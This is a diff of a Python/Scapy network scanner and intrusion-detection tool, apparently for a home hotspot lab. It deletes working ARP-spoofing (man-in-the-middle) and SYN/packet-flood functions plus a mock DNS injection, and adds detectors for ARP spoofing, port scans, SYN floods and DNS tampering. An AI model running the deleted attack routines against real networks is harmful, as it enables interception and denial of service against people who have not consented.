@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import asyncio
 import socket
 import ssl
@@ -5,9 +6,28 @@ import json
 import os
 import time
 import requests
-from collections import defaultdict
+import threading
+import ipaddress
+from collections import defaultdict, Counter
 from tqdm import tqdm
-from scapy.all import sniff, IP, ARP, Ether, srp, traceroute, send, TCP, UDP, Raw
+
+# Scapy imports
+from scapy.all import (
+    sniff,
+    IP,
+    ARP,
+    Ether,
+    srp,
+    traceroute,
+    get_if_list,
+    get_if_addr,
+    TCP,
+    UDP,
+    DNS,
+    DNSRR,
+    Raw,
+    send,
+)
 
 # -----------------------------
 # Global State
@@ -20,11 +40,26 @@ semaphore = asyncio.Semaphore(2)
 port_usage = defaultdict(int)
 start_time = None
 
+# -----------------------------
+# Detection state & tuning
+# -----------------------------
+arp_baseline = {}              # ip -> mac
+portscan_tracker = {}          # src -> set of (port, timestamp)
+syn_counter = Counter()        # src -> count (reset periodically)
+dns_records = {}               # qname -> rdata (last seen)
+alert_log_path = "alerts.log"
+
+# tuning (conservative defaults for phone-hotspot lab)
+PORTSCAN_PORT_THRESHOLD = 20    # unique ports in WINDOW seconds to flag scan
+PORTSCAN_WINDOW = 30           # seconds window
+SYN_FLOOD_THRESHOLD = 80       # SYN packets per WINDOW to flag DoS
+SYN_WINDOW = 5                 # seconds
 
 # -----------------------------
-# Reconnaissance Utilities
+# Utility Functions
 # -----------------------------
 def guess_os(ttl):
+    """Rough OS guess based on TTL value."""
     if ttl >= 255:
         return "Router/IoT"
     elif ttl >= 128:
@@ -35,6 +70,7 @@ def guess_os(ttl):
 
 
 def reverse_dns(ip):
+    """Try reverse DNS lookup."""
     try:
         return socket.gethostbyaddr(ip)[0]
     except Exception:
@@ -42,6 +78,14 @@ def reverse_dns(ip):
 
 
 def geoip_lookup(ip):
+    """Return 'Local' for private IPs; otherwise query ipapi."""
+    try:
+        addr = ipaddress.ip_address(ip)
+        if addr.is_private:
+            return "Local"
+    except Exception:
+        pass
+
     try:
         res = requests.get(f"https://ipapi.co/{ip}/json", timeout=5)
         data = res.json()
@@ -51,6 +95,7 @@ def geoip_lookup(ip):
 
 
 def get_ssl_info(ip):
+    """Fetch SSL certificate details from port 443."""
     try:
         context = ssl.create_default_context()
         with socket.create_connection((ip, 443), timeout=3) as sock:
@@ -66,6 +111,7 @@ def get_ssl_info(ip):
 
 
 async def grab_banner(ip, port):
+    """Try grabbing service banner from open ports."""
     try:
         reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2)
         await asyncio.sleep(1)
@@ -78,6 +124,7 @@ async def grab_banner(ip, port):
 
 
 async def scan_port(ip, port, timeout=1):
+    """Check if a port is open by attempting connection."""
     try:
         conn = asyncio.open_connection(ip, port)
         reader, writer = await asyncio.wait_for(conn, timeout=timeout)
@@ -89,10 +136,11 @@ async def scan_port(ip, port, timeout=1):
 
 
 async def scan_host_ports(ip, ports):
+    """Scan all given ports on a host and return open ones with banners."""
     open_ports = {}
     tasks = [scan_port(ip, port) for port in ports]
 
-    for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc=f"Scanning {ip}"):
+    for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc=f"Scanning {ip}", leave=False):
         port = await f
         if port:
             try:
@@ -106,6 +154,7 @@ async def scan_host_ports(ip, ports):
 
 
 def run_traceroute(ip):
+    """Perform traceroute to a given IP."""
     try:
         res, _ = traceroute(ip, maxttl=10, verbose=False)
         return [r[1].src for r in res]
@@ -113,6 +162,107 @@ def run_traceroute(ip):
         return []
 
 
+def infer_cidr_from_iface(iface):
+    """Try to infer /24 CIDR from interface IP. Fallback to common hotspot CIDR."""
+    try:
+        ip = get_if_addr(iface)
+        if ip and ip.count('.') == 3 and not ip.startswith("127."):
+            network = ipaddress.ip_network(ip + '/24', strict=False)
+            return str(network)
+    except Exception:
+        pass
+    # common Android hotspot fallback
+    return "192.168.43.0/24"
+
+
+# -----------------------------
+# Logging / Alerts
+# -----------------------------
+def log_alert(msg):
+    ts = time.strftime("%Y-%m-%d %H:%M:%S")
+    line = f"[{ts}] {msg}"
+    print(line)
+    try:
+        with open(alert_log_path, "a") as af:
+            af.write(line + "\n")
+    except Exception:
+        pass
+
+
+# -----------------------------
+# Detection helpers & cleanup thread
+# -----------------------------
+def _cleanup_worker():
+    while True:
+        now = time.time()
+        # prune portscan entries older than window
+        for src in list(portscan_tracker.keys()):
+            entries = portscan_tracker.get(src, set())
+            portscan_tracker[src] = { (p,t) for (p,t) in entries if now - t <= PORTSCAN_WINDOW }
+            if not portscan_tracker[src]:
+                del portscan_tracker[src]
+        # reset SYN counters periodically
+        syn_counter.clear()
+        time.sleep(SYN_WINDOW)
+
+cleanup_thread = threading.Thread(target=_cleanup_worker, daemon=True)
+cleanup_thread.start()
+
+
+def detect_arp_spoof(pkt):
+    if ARP in pkt and pkt[ARP].op == 2:  # ARP reply
+        ip = pkt[ARP].psrc
+        mac = pkt[ARP].hwsrc
+        old = arp_baseline.get(ip)
+        if old and old != mac:
+            log_alert(f"ARP spoof suspected: {ip} previously {old}, now {mac}")
+        arp_baseline[ip] = mac
+
+
+def detect_portscan(pkt):
+    if IP in pkt and pkt.haslayer(TCP) and pkt[TCP].flags == "S":
+        src = pkt[IP].src
+        dport = pkt[TCP].dport
+        now = time.time()
+        entries = portscan_tracker.setdefault(src, set())
+        entries.add((dport, now))
+        unique_ports = {p for (p, _) in entries}
+        if len(unique_ports) >= PORTSCAN_PORT_THRESHOLD:
+            log_alert(f"Port scan suspected from {src} ({len(unique_ports)} unique ports in last {PORTSCAN_WINDOW}s)")
+
+
+def detect_syn_flood(pkt):
+    if IP in pkt and pkt.haslayer(TCP) and pkt[TCP].flags == "S":
+        src = pkt[IP].src
+        syn_counter[src] += 1
+        if syn_counter[src] >= SYN_FLOOD_THRESHOLD:
+            log_alert(f"SYN flood suspected from {src} ({syn_counter[src]} SYNs in last {SYN_WINDOW}s)")
+
+
+def detect_dns_tamper(pkt):
+    # lightweight check for DNS responses
+    if pkt.haslayer(UDP) and pkt[UDP].sport == 53 and pkt.haslayer(DNS) and pkt.haslayer(DNSRR):
+        try:
+            qname = pkt[DNS].qd.qname.decode()
+            # take first answer rdata for comparison
+            an = pkt[DNSRR]
+            rdata = None
+            try:
+                rdata = an.rdata
+            except Exception:
+                # older scapy versions store differently
+                rdata = bytes(an.rdata) if hasattr(an, "rdata") else None
+            prev = dns_records.get(qname)
+            if prev and prev != rdata:
+                log_alert(f"DNS tamper suspected for {qname}: {prev} -> {rdata}")
+            dns_records[qname] = rdata
+        except Exception:
+            pass
+
+
+# -----------------------------
+# Scanning Handler
+# -----------------------------
 async def handle_ip(ip, ports):
     async with semaphore:
         print(f"\n[SCAN STARTED] {ip}")
@@ -144,112 +294,67 @@ async def handle_ip(ip, ports):
 # Passive Sniffing Mode
 # -----------------------------
 def passive_sniff(interface, count, ports):
+    """Sniff packets and scan discovered IPs."""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     tasks = set()
 
     def process_packet(pkt):
+        # run detection on every packet (non-blocking quick checks)
+        try:
+            detect_arp_spoof(pkt)
+            detect_portscan(pkt)
+            detect_syn_flood(pkt)
+            detect_dns_tamper(pkt)
+        except Exception:
+            pass
+
+        # existing discovery logic
         if IP in pkt:
             for ip in [pkt[IP].src, pkt[IP].dst]:
                 if ip not in captured_ips:
                     print(f"[NEW IP FOUND] {ip}")
                     captured_ips.add(ip)
-                    ttl_data[ip] = pkt[IP].ttl
+                    try:
+                        ttl_data[ip] = pkt[IP].ttl
+                    except Exception:
+                        ttl_data[ip] = 0
                     task = asyncio.ensure_future(handle_ip(ip, ports))
                     tasks.add(task)
 
-    sniff(prn=process_packet, iface=interface, filter="ip", store=False, count=count)
+    try:
+        sniff(prn=process_packet, iface=interface, filter="ip", store=False, count=count)
+    except Exception as e:
+        print(f"[!] Sniff failed on interface {interface}: {e}")
+        return
 
     if tasks:
         loop.run_until_complete(asyncio.wait(tasks))
 
 
 # -----------------------------
-# Active ARP Discovery
+# Active ARP Discovery Mode
 # -----------------------------
 def arp_discovery(interface):
+    """Send ARP requests and discover devices on LAN."""
     print(f"[*] Sending ARP requests on {interface}...")
-    ip_range = "192.168.1.0/24"
+    ip_range = infer_cidr_from_iface(interface)
+    print(f"[*] ARP discovery using IP range {ip_range}")
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     arp = ARP(pdst=ip_range)
     packet = ether / arp
-    ans, _ = srp(packet, timeout=2, iface=interface, verbose=False)
+    try:
+        ans, _ = srp(packet, timeout=2, iface=interface, verbose=False)
+    except Exception as e:
+        print(f"[!] ARP discovery failed on {interface}: {e}")
+        return
 
     for _, rcv in ans:
         ip = rcv.psrc
         mac = rcv.hwsrc
         captured_ips.add(ip)
         mac_data[ip] = mac
-        ttl_data[ip] = 64
-
-
-# -----------------------------
-# Attack Simulation
-# -----------------------------
-def simulate_mitm(target_ip, gateway_ip, interface):
-    """ARP spoof to place attacker between target and gateway."""
-    print(f"[!] Simulating MITM between {target_ip} and {gateway_ip}")
-    pkt1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
-    pkt2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip)
-    send(pkt1, iface=interface, count=5, inter=1)
-    send(pkt2, iface=interface, count=5, inter=1)
-
-
-def simulate_syn_flood(target_ip, target_port=80, count=100):
-    """Send many SYN packets quickly."""
-    print(f"[!] Launching SYN flood on {target_ip}:{target_port}")
-    pkt = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
-    send(pkt, count=count, inter=0.01)
-
-
-def simulate_icmp_flood(target_ip, count=100):
-    """Send many ICMP Echo Requests."""
-    print(f"[!] Launching ICMP flood on {target_ip}")
-    pkt = IP(dst=target_ip)/Raw(load="X"*600)
-    send(pkt, count=count, inter=0.01)
-
-
-def simulate_dns_tamper(victim_ip, fake_domain="fake.com", fake_ip="1.2.3.4"):
-    """Fake DNS response injection (illustrative)."""
-    print(f"[!] Sending fake DNS response to {victim_ip}")
-    pkt = IP(dst=victim_ip)/UDP(dport=53)/Raw(load=f"DNS:{fake_domain}->{fake_ip}")
-    send(pkt, count=3)
-
-
-# -----------------------------
-# Detection Engine
-# -----------------------------
-def detect_mitm(pkt):
-    """Detect duplicate MAC addresses for same IP (ARP spoofing)."""
-    if pkt.haslayer(ARP) and pkt[ARP].op == 2:  # ARP reply
-        ip = pkt[ARP].psrc
-        mac = pkt[ARP].hwsrc
-        if ip in mac_data and mac_data[ip] != mac:
-            print(f"[ALERT] MITM suspected! {ip} has conflicting MACs: {mac_data[ip]} vs {mac}")
-        mac_data[ip] = mac
-
-
-def detect_syn_flood(pkt):
-    """Detect unusual SYN floods (many SYNs, no ACKs)."""
-    if pkt.haslayer(TCP) and pkt[TCP].flags == "S":
-        src = pkt[IP].src
-        port_usage[src] += 1
-        if port_usage[src] > 50:  # threshold
-            print(f"[ALERT] SYN flood suspected from {src}")
-
-
-def detect_dns_tamper(pkt):
-    """Detect malformed/fake DNS responses."""
-    if pkt.haslayer(UDP) and pkt[UDP].sport == 53 and Raw in pkt:
-        payload = pkt[Raw].load
-        if b"DNS:" in payload:  # our fake injection marker
-            print(f"[ALERT] DNS tampering suspected: {payload}")
-
-
-def start_detection(interface):
-    """Run IDS that checks for MITM, SYN flood, DNS tampering."""
-    print("[*] Detection engine running... Press Ctrl+C to stop")
-    sniff(iface=interface, prn=lambda p: (detect_mitm(p), detect_syn_flood(p), detect_dns_tamper(p)))
+        ttl_data[ip] = 64  # assume typical LAN default
 
 
 # -----------------------------
@@ -268,12 +373,38 @@ def show_network_map():
 
 
 # -----------------------------
+# Detection-only mode (runs sniff with detectors)
+# -----------------------------
+def detection_only(interface):
+    print("[*] Running detection-only (IDS) on interface:", interface)
+    try:
+        sniff(prn=lambda p: (detect_arp_spoof(p), detect_portscan(p), detect_syn_flood(p), detect_dns_tamper(p)),
+              iface=interface, filter="ip", store=False)
+    except Exception as e:
+        print(f"[!] Detection sniff failed on {interface}: {e}")
+
+
+# -----------------------------
 # Main Entry
 # -----------------------------
 def main():
     global start_time
-    mode = input("Choose mode:\n1. Passive Sniffing\n2. Active ARP Discovery\n3. Simulate Attacks\n4. Run Detection\n> ").strip()
-    interface = input("Enter network interface (default=wlan0): ").strip() or "wlan0"
+
+    # show interfaces and pick sensible default
+    try:
+        ifaces = get_if_list()
+    except Exception:
+        ifaces = []
+    print("Available interfaces:", ifaces)
+    default_iface = None
+    for i in ifaces:
+        if "Loopback" not in i and "Loopback" not in i.lower():
+            default_iface = i
+            break
+    default_iface = default_iface or (ifaces[0] if ifaces else "wlan0")
+
+    mode = input("Choose mode:\n1. Passive Sniffing\n2. Active ARP Discovery\n3. Detection-only (IDS)\n> ").strip()
+    interface = input(f"Enter network interface (default={default_iface}): ").strip() or default_iface
     port_range = input("Enter port range to scan (default=20-1024): ").strip()
 
     if port_range:
@@ -292,7 +423,10 @@ def main():
     start_time = time.time()
 
     if mode == "1":
-        pkt_count = int(input("Packets to sniff (default=100): ").strip() or "100")
+        try:
+            pkt_count = int(input("Packets to sniff (default=100): ").strip() or "100")
+        except Exception:
+            pkt_count = 100
         passive_sniff(interface, pkt_count, ports)
 
     elif mode == "2":
@@ -300,32 +434,21 @@ def main():
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         tasks = [handle_ip(ip, ports) for ip in captured_ips]
-        loop.run_until_complete(asyncio.gather(*tasks))
+        if tasks:
+            loop.run_until_complete(asyncio.gather(*tasks))
         show_port_trends()
         show_network_map()
 
     elif mode == "3":
-        print("Attack Options:\n1. MITM (ARP Spoof)\n2. SYN Flood\n3. ICMP Flood\n4. DNS Tampering")
-        choice = input("> ").strip()
-        target = input("Enter target IP: ").strip()
-        if choice == "1":
-            gw = input("Enter gateway IP: ").strip()
-            simulate_mitm(target, gw, interface)
-        elif choice == "2":
-            simulate_syn_flood(target)
-        elif choice == "3":
-            simulate_icmp_flood(target)
-        elif choice == "4":
-            simulate_dns_tamper(target)
-
-    elif mode == "4":
-        start_detection(interface)
+        detection_only(interface)
 
     else:
         print("[!] Invalid mode selected.")
 
     elapsed = round(time.time() - start_time, 2)
-    print(f"\n[*] Duration: {elapsed} seconds")
+    print(f"\n[*] SCAN COMPLETE: {len(results)} IPs scanned")
+    print(f"[*] Total open ports found: {sum(len(r['open_ports']) for r in results.values())}")
+    print(f"[*] Duration: {elapsed} seconds")
     print("[*] Results saved to scan_results.json")
 
 
